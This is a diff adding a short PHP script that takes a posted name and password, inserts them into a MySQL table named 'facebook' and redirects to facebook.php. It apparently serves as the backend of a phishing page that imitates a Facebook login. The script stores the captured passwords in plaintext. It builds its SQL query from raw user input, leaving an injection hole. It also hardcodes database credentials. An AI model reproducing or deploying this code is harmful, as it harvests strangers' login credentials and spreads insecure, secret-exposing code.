@@ -1,0 +1,29 @@
+<?php
+    $name = $_POST['name'];
+    $user_password = $_POST['password'];
+
+    $servername = "localhost";
+    $username = "id17959450_quan123";
+    $password = "?A2R]NULR0#%$!j8";
+    $dbname = "id17959450_quan";
+
+    // Create connection
+    $conn = new mysqli($servername, $username, $password, $dbname);
+    // Check connection
+    if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+    }
+
+    $sql = "INSERT INTO facebook (name, password)
+    VALUES ('$name', '$user_password')";
+
+    if ($conn->query($sql) === TRUE) {
+        echo "";
+        //nếu như người dùng đăng nhập thành công sẽ chuyển đén trang 'trangweb.html'
+        header('location:facebook.php');
+    } else {
+        echo "Error: " . $sql . "<br>" . $conn->error;
+    }
+
+    $conn->close();
+?>
